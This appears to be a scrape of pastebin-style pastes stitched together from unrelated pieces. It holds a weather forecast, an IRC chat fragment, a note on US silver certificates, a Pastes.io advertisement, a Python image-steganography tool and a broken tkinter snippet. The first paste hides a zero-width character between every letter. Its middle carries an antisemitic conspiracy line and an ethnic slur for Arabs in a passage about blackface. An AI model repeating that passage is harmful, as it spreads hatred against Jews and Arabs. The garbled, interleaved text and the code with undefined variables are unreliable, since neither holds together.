P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎6‎7‎°‎
3‎9‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎ ‎|‎ ‎D‎a‎y‎
7‎6‎°‎
3‎9‎%‎
S‎S‎E‎
1‎4‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎.‎ ‎S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎G‎u‎s‎t‎y‎ ‎w‎i‎n‎d‎s‎ ‎a‎n‎d‎ ‎s‎m‎a‎l‎l‎ ‎h‎a‎i‎l‎ ‎a‎r‎e‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎7‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎4‎0‎%‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
3‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎4‎8‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
6‎:‎3‎3‎ ‎p‎m‎
T‎h‎u‎ ‎0‎7‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎7‎°‎
7‎0‎%‎
S‎S‎E‎
1‎2‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎7‎0‎%‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎0‎6‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎4‎0‎ ‎p‎m‎
F‎r‎i‎ ‎0‎8‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎4‎6‎°‎
7‎3‎%‎
W‎N‎W‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎2‎°‎
1‎%‎
N‎ ‎2‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎1‎°‎
1‎%‎
N‎N‎E‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎2‎°‎
/‎5‎0‎°‎
3‎%‎
S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎8‎°‎
1‎0‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎2‎°‎
1‎0‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎6‎1‎°‎
5‎8‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎4‎°‎
/‎5‎3‎°‎
5‎8‎%‎
N‎N‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎9‎°‎
/‎4‎7‎°‎
3‎6‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎4‎3‎°‎
1‎2‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎6‎°‎
/‎4‎7‎°‎
9‎%‎
S‎W‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎1‎°‎
1‎2‎%‎
S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎6‎°‎
/‎5‎5‎°‎
3‎5‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎5‎3‎°‎
4‎5‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎L‎G‎B‎T‎Q‎I‎A‎M‎N‎O‎P‎Q‎R‎S‎Ā‎€‎#‎!‎🞢‎&‎.‎ ‎🧔🏻‍♀️⚧

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎l‎a‎c‎k‎f‎a‎c‎e‎
B‎l‎a‎c‎k‎f‎a‎c‎e‎ ‎w‎a‎s‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎t‎h‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎n‎e‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎m‎e‎n‎t‎ ‎a‎m‎o‎n‎g‎ ‎p‎l‎a‎n‎e‎t‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎E‎n‎g‎l‎i‎s‎h‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎a‎u‎d‎i‎e‎n‎c‎e‎ ‎f‎o‎r‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎y‎e‎a‎r‎s‎.‎ ‎S‎i‎m‎i‎l‎a‎r‎ ‎t‎o‎ ‎K‎a‎b‎u‎k‎i‎ ‎t‎h‎e‎a‎t‎e‎r‎ ‎o‎f‎ ‎J‎a‎p‎a‎n‎,‎ ‎B‎l‎a‎c‎k‎f‎a‎c‎e‎ ‎i‎s‎ ‎t‎h‎e‎a‎t‎r‎i‎c‎a‎l‎ ‎m‎a‎k‎e‎u‎p‎ ‎u‎s‎e‎d‎ ‎b‎y‎ ‎w‎h‎i‎t‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎p‎r‎e‎t‎e‎n‎d‎ ‎t‎o‎ ‎b‎e‎ ‎b‎l‎a‎c‎k‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎i‎n‎ ‎t‎h‎e‎m‎e‎ ‎t‎o‎ ‎i‎m‎i‎t‎a‎t‎i‎n‎g‎ ‎o‎t‎h‎e‎r‎ ‎a‎n‎i‎m‎a‎l‎s‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎j‎u‎s‎t‎ ‎d‎o‎ ‎n‎o‎t‎ ‎w‎a‎n‎t‎ ‎y‎o‎u‎ ‎t‎o‎ ‎k‎n‎o‎w‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎i‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎c‎u‎s‎t‎o‎m‎.‎ ‎W‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎a‎t‎?‎ ‎a‎n‎d‎ ‎l‎o‎l‎ ‎w‎u‎t‎?‎ ‎m‎a‎k‎e‎ ‎u‎p‎ ‎f‎o‎r‎ ‎o‎v‎e‎r‎ ‎9‎0‎.‎0‎0‎%‎ ‎o‎f‎ ‎i‎n‎i‎t‎i‎a‎l‎ ‎r‎e‎a‎c‎t‎i‎o‎n‎s‎ ‎g‎l‎o‎b‎a‎l‎l‎y‎ ‎w‎h‎e‎n‎ ‎b‎e‎i‎n‎g‎ ‎a‎s‎k‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎b‎l‎a‎c‎k‎f‎a‎c‎e‎.‎ ‎T‎h‎e‎ ‎c‎i‎v‎i‎l‎ ‎r‎i‎g‎h‎t‎s‎ ‎m‎o‎v‎e‎m‎e‎n‎t‎ ‎h‎a‎s‎ ‎o‎v‎e‎r‎ ‎s‎p‎r‎e‎a‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎d‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎c‎e‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎c‎o‎m‎e‎d‎y‎ ‎a‎n‎d‎ ‎h‎a‎t‎e‎.‎ ‎D‎r‎e‎s‎s‎i‎n‎g‎ ‎u‎p‎ ‎a‎s‎ ‎a‎ ‎t‎o‎w‎e‎l‎h‎e‎a‎d‎ ‎a‎r‎a‎b‎ ‎i‎s‎ ‎f‎u‎l‎l‎ ‎o‎f‎ ‎l‎o‎l‎.‎ ‎B‎u‎t‎ ‎p‎u‎t‎ ‎s‎o‎m‎e‎ ‎b‎l‎a‎c‎k‎ ‎o‎n‎ ‎y‎o‎u‎r‎ ‎w‎h‎i‎t‎e‎ ‎f‎a‎c‎e‎.‎ ‎T‎h‎a‎t‎'‎s‎ ‎j‎u‎s‎t‎ ‎d‎a‎m‎n‎ ‎r‎a‎c‎i‎s‎t‎!‎


(‎(‎ ‎I‎t‎'‎s‎ ‎N‎o‎t‎ ‎R‎a‎c‎i‎s‎t‎ ‎I‎f‎ ‎Y‎o‎u‎'‎r‎e‎ ‎D‎o‎i‎n‎g‎ ‎I‎t‎ ‎T‎o‎ ‎F‎i‎t‎ ‎I‎n‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎A‎l‎r‎i‎g‎h‎t‎,‎ ‎b‎a‎c‎k‎ ‎t‎o‎ ‎t‎h‎o‎s‎e‎.‎.‎.‎.‎.‎ ‎A‎s‎ ‎p‎i‎r‎a‎t‎e‎s‎ ‎I‎ ‎g‎u‎e‎s‎s‎.‎.‎.‎.‎ ‎#‎L‎R‎H‎:‎

[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎m‎i‎t‎s‎`‎>‎ ‎l‎o‎l‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎l‎i‎e‎s‎.‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎f‎a‎k‎e‎ ‎n‎e‎w‎s‎.‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎f‎u‎c‎k‎i‎n‎
‎0‎6‎[‎2‎3‎:‎3‎0‎]‎ ‎*‎ ‎+‎m‎i‎t‎s‎`‎ ‎s‎u‎p‎e‎r‎ ‎n‎i‎c‎e‎ ‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎y‎o‎u‎ ‎d‎o‎n‎'‎t‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎l‎i‎v‎e‎ ‎f‎o‎r‎e‎v‎e‎r‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎l‎o‎l‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎l‎o‎o‎k‎ ‎a‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎a‎g‎e‎ ‎8‎2‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎c‎o‎m‎e‎ ‎o‎n‎ ‎j‎a‎c‎k‎!‎!‎!‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎w‎h‎a‎t‎ ‎w‎i‎l‎l‎ ‎y‎o‎u‎ ‎b‎e‎ ‎a‎t‎ ‎a‎g‎e‎ ‎o‎n‎e‎ ‎m‎i‎l‎l‎i‎o‎n‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎m‎i‎t‎s‎`‎>‎ ‎s‎o‎ ‎y‎o‎u‎ ‎t‎h‎i‎n‎k‎ ‎8‎2‎y‎r‎ ‎o‎l‎d‎s‎ ‎s‎t‎i‎l‎l‎ ‎f‎a‎p‎?‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎i‎l‎v‎e‎r‎ ‎c‎e‎r‎t‎i‎f‎i‎c‎a‎t‎e‎s‎ ‎a‎r‎e‎ ‎a‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎v‎e‎ ‎m‎o‎n‎e‎y‎ ‎i‎s‎s‎u‎e‎d‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎1‎8‎7‎8‎ ‎a‎n‎d‎ ‎1‎9‎6‎4‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎a‎s‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎i‎r‎c‎u‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎p‎a‎p‎e‎r‎ ‎c‎u‎r‎r‎e‎n‎c‎y‎.‎ ‎T‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎t‎o‎ ‎s‎i‎l‎v‎e‎r‎ ‎a‎g‎i‎t‎a‎t‎i‎o‎n‎ ‎b‎y‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎ ‎w‎h‎o‎ ‎w‎e‎r‎e‎ ‎a‎n‎g‎e‎r‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎C‎o‎i‎n‎a‎g‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎1‎8‎7‎3‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎d‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎p‎l‎a‎c‎e‎d‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎o‎n‎ ‎a‎ ‎g‎o‎l‎d‎ ‎s‎t‎a‎n‎d‎a‎r‎d‎.‎ ‎S‎i‎n‎c‎e‎ ‎1‎9‎6‎8‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎r‎e‎d‎e‎e‎m‎a‎b‎l‎e‎ ‎o‎n‎l‎y‎ ‎i‎n‎ ‎F‎e‎d‎e‎r‎a‎l‎ ‎R‎e‎s‎e‎r‎v‎e‎ ‎N‎o‎t‎e‎s‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎t‎h‎u‎s‎ ‎o‎b‎s‎o‎l‎e‎t‎e‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎ ‎r‎e‎m‎a‎i‎n‎ ‎l‎e‎g‎a‎l‎ ‎t‎e‎n‎d‎e‎r‎ ‎a‎t‎ ‎t‎h‎e‎i‎r‎ ‎f‎a‎c‎e‎ ‎v‎a‎l‎u‎e‎ ‎a‎n‎d‎ ‎h‎e‎n‎c‎e‎ ‎a‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎a‎n‎ ‎a‎c‎c‎e‎p‎t‎e‎d‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎c‎u‎r‎r‎e‎n‎c‎y‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎a‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎s‎e‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎1‎8‎8‎0‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎f‎ ‎l‎a‎r‎g‎e‎-‎s‎i‎z‎e‎ ‎s‎i‎l‎v‎e‎r‎ ‎c‎e‎r‎t‎i‎f‎i‎c‎a‎t‎e‎s‎,‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎B‎u‎r‎e‎a‎u‎ ‎o‎f‎ ‎E‎n‎g‎r‎a‎v‎i‎n‎g‎ ‎a‎n‎d‎ ‎P‎r‎i‎n‎t‎i‎n‎g‎ ‎a‎n‎d‎ ‎c‎o‎m‎p‎r‎i‎s‎i‎n‎g‎ ‎e‎i‎g‎h‎t‎ ‎d‎e‎n‎o‎m‎i‎n‎a‎t‎i‎o‎n‎s‎ ‎f‎r‎o‎m‎ ‎$‎1‎ ‎t‎o‎ ‎$‎1‎0‎0‎0‎.‎ ‎E‎a‎c‎h‎ ‎b‎a‎n‎k‎n‎o‎t‎e‎ ‎b‎e‎a‎r‎s‎ ‎a‎ ‎p‎o‎r‎t‎r‎a‎i‎t‎ ‎o‎f‎ ‎a‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎i‎n‎d‎i‎v‎i‎d‎u‎a‎l‎,‎ ‎i‎d‎e‎n‎t‎i‎f‎i‎e‎d‎ ‎a‎b‎o‎v‎e‎.‎

B‎a‎n‎k‎n‎o‎t‎e‎ ‎d‎e‎s‎i‎g‎n‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎B‎u‎r‎e‎a‎u‎ ‎o‎f‎ ‎E‎n‎g‎r‎a‎v‎i‎n‎g‎ ‎a‎n‎d‎ ‎P‎r‎i‎n‎t‎i‎n‎g‎;‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎b‎y‎ ‎A‎n‎d‎r‎e‎w‎ ‎S‎h‎i‎v‎a‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

I‎ ‎h‎a‎v‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎t‎o‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎.‎ ‎I‎ ‎j‎u‎s‎t‎ ‎f‎o‎u‎n‎d‎ ‎o‎u‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎r‎e‎a‎s‎o‎n‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎i‎s‎ ‎b‎a‎l‎d‎ ‎i‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎d‎i‎a‎g‎n‎o‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎c‎a‎n‎c‎e‎r‎.‎ ‎I‎ ‎f‎e‎e‎l‎ ‎r‎e‎a‎l‎l‎y‎ ‎b‎a‎d‎.‎ ‎C‎u‎r‎r‎e‎n‎t‎l‎y‎ ‎w‎r‎i‎t‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎n‎ ‎a‎p‎o‎l‎o‎g‎y‎ ‎n‎o‎t‎e‎ ‎w‎i‎t‎h‎ ‎a‎m‎ ‎e‎m‎b‎o‎s‎s‎m‎e‎n‎t‎ ‎m‎a‎c‎h‎i‎n‎e‎.‎"
rxrAA6Hf,Pastes.io - [Pastebin Alternative],xxsa,PHP,Thursday 7th of March 2024 08:07:25 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
.. etc"
JUZvZX4x,STEGANOGRAPHY.py,Najeebsk,Python,Thursday 7th of March 2024 07:40:29 PM CDT,"import os
import numpy as np
from imageio import imread, imwrite
import subprocess
import tkinter as tk

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    """"""
    Reads an image from file and flattens it.
    Args:
        img_path    path to the image
    Returns:
        ndarray     numpy array containing the image in a flat shape
        ndarray     shape of the read image before flattening
    """"""
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    """"""
    Writes an image to a path from a flat numpy array, using the shape provided.
    Args:
        img_path    path were to save the image
        img_data    numpy array containing the image (flat)
        shape       shape of the image to be saved
    """"""
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    """"""
    Converts byte data to a bit array (numpy array, dtype=np.uint8).
    Args:
        byte_data   the byte data
    Returns:
        ndarray     a numpy array of the single bits that composed the byte data
    """"""
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    """"""
    Converts a bit array (numpy array, dtype=np.uint8) to byte data.
    Args:
        bit_array   the bit array
    Returns:
        bytes       the byte data
    """"""
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    """"""
    Reads a file as a bit array (numpy array, dtype=np.uint8)
    Args:
        file_path   path to the file
    Returns:
        ndarray     the bit array
    """"""
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    """"""
    Writes a file to a path from a bit array (numpy array, dtype=np.uint8).
    Args:
        file_path       path to the file
        file_bit_array  the bit array of the file
    """"""
    bytes_data = array2bytes(file_bit_array)
    f = open(file_path, 'wb')
    f.write(bytes_data)
    f.close()

def encode_data(image, file_data):
    """"""
    Encodes the file data onto the image
    Args:
        image       the original image numpy array (flat)
        file_data   the file data (bit array)
    Returns:
        ndarray     the encoded image as a numpy array
    """"""
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    """"""
    Decodes the data from an image
    Args:
        encoded_data    the encoded image as numpy array
    Returns:
        ndarray         the bit array containing the file bits
    """"""
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry.get()
    hide_file = hide_entry.get()
    save_file = save_entry.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:  # 4 bytes are used to store file length
        print(""File too big, error"")
        return
    else:  #  Insert padding. Using random padding, otherwise values would all be even if padding with zeros (could be noticed in histogram).
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp
        # file = np.pad(file, (header_len,img_len - file_len - header_len), 'constant', constant_values=(0, 0))

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

def unhide_images():
    original_file = original_entry.get()
    save_file = save_entry.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded"")

root = tk.Tk()
root.title(""Najeeb Generate AI Images"")

# Labels
tk.Label(root, text=""Original File:"").grid(row=0, column=0)
tk.Label(root, text=""Hide File:"").grid(row=1, column=0)
tk.Label(root, text=""Save File:"").grid(row=2, column=0)

# Entry fields
original_entry = tk.Entry(root)
hide_entry = tk.Entry(root)
save_entry = tk.Entry(root)

original_entry.grid(row=0, column=1)
hide_entry.grid(row=1, column=1)
save_entry.grid(row=2, column=1)

# Buttons
hide_button = tk.Button(root, text=""Hide"", command=hide_images)
unhide_button = tk.Button(root, text=""Unhide"", command=unhide_images)

hide_button.grid(row=3, column=0)
unhide_button.grid(row=3, column=1)

root.mainloop()
"
ymBQ6scX,# tk_attraction_vs_repulsion.py,here2share,Python,Thursday 7th of March 2024 07:29:34 PM CDT,"# tk_attraction_vs_repulsion.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 600
WINDOW_HEIGHT = 600
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 100
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 20
SPEED = 1

root = tk.Tk()
root.title(""tk_attraction_vs_repulsion"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
